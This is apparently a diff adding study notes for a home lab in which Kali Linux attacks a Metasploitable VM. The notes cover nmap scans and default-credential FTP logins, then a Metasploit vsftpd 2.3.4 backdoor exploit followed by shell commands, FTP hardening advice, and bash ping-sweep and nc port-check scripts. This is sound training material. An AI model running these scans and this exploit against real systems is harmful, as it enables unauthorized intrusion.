@@ -1,0 +1,132 @@
+Install VMware 
+       - install kali Linux 
+       - install metasploitable Linux 
+
+change the settings 
+        - to host only 
+
+ip addr
+
+
+find the ip address of both make sure both ip address are different 
+try to ping from kali to Metasploit, from Metasploit to kali 
+
+
+find the ip address of Metasploit from kali 
+         nmap -sn 192.168.190.0/24
+
+
+scan the ip
+         nmap -sV 192.168.190.130
+
+
+
+Scan open ports
+nmap 192.168.190.130
+
+
+Scan service versions
+nmap -sV 192.168.190.130
+
+
+Save scan result
+nmap -sV 192.168.190.130 -oN metasploitable_scan.txt
+
+detailed scan 
+nmap -A 192.168.190.130 -oN detailedscan.txt
+
+Open port → identify service/version → search known vulnerability → use matching Metasploit module → document result.
+
+
+
+will try ftp
+
+1. enter into ftp
+ftp 192.168.190.130 
+
+login without exploit
+name: anonymous
+password: anonymous
+
+type: pwd 
+      ls 
+      ls -a 
+
+      try to transfer the file from kali
+      create a file in kali --- called ftp.txt 
+
+      put ftp.txt
+
+      it wont allow, because this user dont have permission 
+
+
+login as : 
+msfadmin
+msfadmin
+
+check 
+  ls 
+  ls -a 
+  pwd 
+
+  put ftp.txt 
+
+
+
+21/tcp open ftp vsftpd 2.3.4
+
+Start Metasploit:
+msfconsole
+
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.190.130
+show options
+run
+
+
+whoami
+hostname
+pwd
+ls
+
+
+Recommendations:
+Upgrade or remove vulnerable FTP service.
+Disable anonymous FTP access.
+Use SFTP instead of FTP.
+Restrict access using firewall rules.
+Monitor FTP logs regularly.
+
+
+
+#!/bin/bash
+
+for ip in 192.168.190.129 192.168.190.130 192.168.190.254
+do
+    echo "Checking $ip"
+    ping -c 1 $ip
+done
+
+
+#!/bin/bash
+
+for i in {1..254}
+do
+    ping -c 1 -W 1 192.168.190.$i > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "Host is up: 192.168.190.$i"
+    fi
+done
+
+
+
+
+TARGET="192.168.190.130"
+
+for port in 21 22 23 25 80 139 445 3306 5432 8180
+do
+    echo "Checking port $port on $TARGET"
+    nc -vz $TARGET $port
+done
